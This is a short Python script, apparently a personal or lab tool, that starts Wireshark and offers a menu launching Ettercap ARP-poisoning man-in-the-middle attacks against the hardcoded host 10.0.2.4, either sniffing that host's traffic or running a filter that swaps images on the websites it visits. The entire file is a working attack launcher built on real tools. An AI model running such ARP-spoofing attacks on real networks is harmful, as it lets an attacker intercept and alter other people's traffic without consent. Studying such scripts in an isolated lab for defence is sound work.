#!/usr/bin/python
import os
import subprocess

subprocess.call(["ifconfig"])
interface = raw_input("Select Interface: ")
print(interface)

interfaceData = os.popen('ifconfig ' + interface + '| grep "inet\ Ad" | cut -d: -f2 | cut -d" " -f1') 
ipAddress = interfaceData.read()
print(ipAddress)

#subprocess.call(["wireshark", "-i", interface])
print("Starting wireshark")
#os.spawnl(os.P_NOWAIT, "/usr/bin/", "wireshark")
wiresharkRunning = subprocess.Popen(["wireshark"])
if(wiresharkRunning):
	print("Wireshark started")

# Starts a normal MITM attack and sniffes the network traffic of the attacked host.
def ettercapMITM():
	subprocess.call(["ettercap", "-T", "-i", interface, "-M", "ARP", "/10.0.2.4//", "///", "&"])

# Replaces all images of websites on the attacked host
def ettercapFun():
	subprocess.call(["ettercap", "-T", "-q", "-F", "catFilter.ef", "-i", interface, "-M", "ARP", "/10.0.2.4//", "///", "&"])	

##########################################
# Show Menu
#########################################
showMenu = True
#while(showMenu):
while(showMenu):
	print("1.\tStart Ettercap in sniffing mode")
	print("2.\tStart Ettercap in fun mode")
	print("e\tExit")
	selection = input("Your selection: ")
	if(selection == 1):
		print("FOOBAR")
		#subprocess.call(["ettercap", "-T", "-i", interface, "-M", "ARP", "/10.0.2.4//", "///", "&"])
		ettercapMITM()
	elif(selection == 2):
		ettercapFun()
	elif(selection == "e"):
		print("Exiting")
		showMenu = False
		




#startMITM = raw_input("Start MITM (y/n?) : ")
#if(startMITM == "y"):
#	subprocess.call(["ettercap", "-T", "-i", interface, "-M" ,"ARP", "/10.0.2.4//", "///", "&"])
